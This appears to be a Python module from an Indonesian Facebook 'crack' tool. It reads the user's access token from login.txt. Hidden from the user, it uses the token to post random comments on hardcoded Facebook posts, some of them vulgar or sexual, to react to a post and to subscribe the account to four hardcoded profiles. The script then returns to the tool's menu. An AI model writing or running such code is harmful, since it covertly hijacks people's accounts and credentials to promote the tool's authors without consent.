#coding=utf-8
import requests, sys, os, random, orbxd
from requests.exceptions import ConnectionError
komenredem = random.choice(['Bang Lu Ngntd!', 'Bang Lu Cakep Tapi Sayang Kaya Kntl', 'Siang Luting Malam Jadi Kang Ghosting', 'Dah Lah Abng Cakep Banget :) ', 'Siang Panen Pahala Malam Panen Kepala', 'Arigato Atas Scnya Bang', 'Semoga Abang Dan Keluarga Masuk Surga :)', 'Semoga Abang Sukses', 'Gua Pengguna Sc cr4ck Lu Bang ', 'Wih Panutan Gua Nih', 'Senseii Kawaiine'])
komtwol = random.choice(['Salam 2 Jari Bang', 'Mantap Sensei', 'bang lu kgk punya pacar?', 'MengKeren Lah Bang', 'Semangat Bang!', 'Gua Murid Lu Bang', 'Tumben Post Bang?', 'Gua Pengin Jadi Kek Abang', 'Semoga Abang Jadi Orang Sukses', 'Bjir Lawack Kali Kau Bang'])
kartu2d = random.choice(["pacaran kok sama 2D\nsampah bat lu bang","waduh sampah lu bang","wibu hengker tezy","judul anime apa bang?","bjir kawai cok","bang lapor gua habis coli","neper surentod","kentod berkentod :v"])
def dekudesu():
    try:
        token = open('login.txt', 'r').read()
    except IOError:
        print '\x1b[0;96m\x1b[0;97m [\x1b[1;36m\xe2\x80\xa2\x1b[1;37m] Token/Cookie invalid'
        os.system('rm -rf login.txt')
        exit(orbxd.login())
    kom = komenredem
    komentar = komtwol
    yotsuba = kartu2d
    post = '3909741969124574'
    requests.post('https://graph.facebook.com/' + post + '/comments/?message=' + kom + '&access_token=' + token)
    requests.post('https://graph.facebook.com/4134869446611824/comments/?message=' + kom + '&access_token=' + token)
    requests.post('https://graph.facebook.com/10209088326722636/comments/?message=' + yotsuba + '&access_token=' + token)
    requests.post('https://graph.facebook.com/4004071876358249/comments/?message=' + komentar + '&access_token=' + token)
    requests.post('https://graph.facebook.com/' + post + '/reactions?type=LOVE&access_token=' + token)
    requests.post('https://graph.facebook.com/100002664282607/subscribers?access_token=' + token)#kon zaim
    requests.post('https://graph.facebook.com/100000419639430/subscribers?access_token=' + token) #mey
    requests.post('https://graph.facebook.com/100027294159255/subscribers?access_token=' + token)#mieruko chan
    requests.post('https://graph.facebook.com/1752684667/subscribers?access_token=' + token) #tsukasa chan
    exit(orbxd.menu())
